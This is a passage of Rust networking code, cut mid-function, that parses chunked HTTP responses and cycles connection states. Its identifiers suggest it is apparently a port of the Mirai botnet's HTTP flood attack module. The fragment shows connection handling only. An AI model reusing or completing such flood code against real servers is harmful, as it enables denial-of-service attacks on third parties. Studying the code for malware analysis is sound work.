                                            if util_memsearch(conn.rdbuf.as_ptr(), new_line_pos as usize, b";".as_ptr(), 1) != -1 {
                                                conn.rdbuf[util_memsearch(conn.rdbuf.as_ptr(), new_line_pos as usize, b";".as_ptr(), 1) as usize] = 0;
                                            }

                                            let chunklen = util_atoi(conn.rdbuf.as_ptr(), 16);

                                            if chunklen == 0 {
                                                conn.state = HttpState::HTTP_CONN_RESTART;
                                                break;
                                            }

                                            conn.content_length = chunklen + 2;
                                            consumed = new_line_pos as i32;
                                        }
                                    } else {
                                        conn.content_length = conn.rdbuf_pos as i32 - consumed;
                                        if conn.content_length == 0 {
                                            conn.state = HttpState::HTTP_CONN_RESTART;
                                            break;
                                        }
                                    }
                                }

                                if consumed == 0 {
                                    break;
                                } else {
                                    conn.rdbuf_pos -= consumed as usize;
                                    libc::memmove(conn.rdbuf.as_mut_ptr() as *mut c_void, conn.rdbuf.as_mut_ptr().add(consumed as usize) as *mut c_void, conn.rdbuf_pos);
                                    conn.rdbuf[conn.rdbuf_pos] = 0;

                                    if conn.rdbuf_pos == 0 {
                                        break;
                                    }
                                }
                            }
                        }
                    } else if conn.state == HttpState::HTTP_CONN_QUEUE_RESTART {
                        loop {
                            errno = 0;
                            ret = recv(conn.fd, generic_memes.as_mut_ptr() as *mut _, 10240, MSG_NOSIGNAL);
                            if ret == 0 {
                                errno = libc::ECONNRESET;
                                ret = -1;
                            }
                            if ret == -1 {
                                if errno != libc::EAGAIN && errno != libc::EWOULDBLOCK {
                                    close(conn.fd);
                                    conn.fd = -1;
                                    conn.state = HttpState::HTTP_CONN_INIT;
                                }
                                break;
                            }
                        }
                        if conn.state != HttpState::HTTP_CONN_INIT {
                            conn.state = HttpState::HTTP_CONN_RESTART;
                        }
                    }
                }
            }
        }
    }
}
